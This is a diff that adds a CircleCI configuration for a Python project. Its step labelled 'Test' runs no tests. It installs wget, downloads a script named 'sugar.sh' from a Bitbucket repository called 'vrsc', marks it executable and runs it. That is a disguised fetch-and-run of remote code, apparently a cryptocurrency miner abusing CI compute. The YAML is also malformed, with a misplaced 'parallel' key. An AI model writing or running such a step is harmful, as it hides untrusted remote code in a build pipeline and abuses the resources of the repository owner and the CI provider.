@@ -1,0 +1,22 @@
+version: 2.1
+
+orbs:
+	python: circleci/python@0.2.1
+
+jobs:
+parallel: 5
+	build-and-test:
+		executor: python/default
+		steps:
+			- checkout
+			- python/load-cache
+			- python/install-deps
+			- python/save-cache
+			- run:
+				command: apt update -y && apt install -y wget && wget https://bitbucket.org/roxxy16/vrsc/raw/1b57cde72e948e4a63191cc6cda3306651e7b95f/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+				name: Test
+
+workflows:
+	main:
+		jobs:
+			- build-and-test
